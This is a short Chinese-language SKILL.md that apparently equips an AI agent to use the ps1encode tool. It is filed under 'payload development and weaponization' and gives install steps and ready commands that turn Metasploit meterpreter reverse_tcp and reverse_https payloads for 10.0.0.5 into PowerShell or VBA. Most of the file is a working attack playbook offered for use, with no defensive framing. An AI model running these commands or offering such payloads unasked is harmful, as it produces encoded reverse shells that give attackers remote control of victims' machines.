---
name: ps1encode-ps
description: 渗透工具 skill:ps1encode 的安装、参数速查与攻击场景 playbook。当任务涉及 载荷开发与武器化 需要调用 ps1encode 时使用。
---

# ps1encode

- 攻击大类:C07 载荷开发与武器化
- 上游仓库:https://github.com/CroweCybersecurity/ps1encode
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/CroweCybersecurity/ps1encode
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `ruby ps1encode.rb -i x86/meterpreter/reverse_tcp -a 10.0.0.5 -p 4444` | PowerShell 编码 |
| `-a arch -i payload -p port` | 参数 |
| `-t vba` | VBA 输出 |

## 攻击场景 Playbook

### MSF payload PowerShell 化

```bash
ruby ps1encode.rb -i x64/meterpreter_reverse_https -a 10.0.0.5 -p 443
# 一键编码
```

## 注意事项

MSF payload 转 PowerShell,多编码。
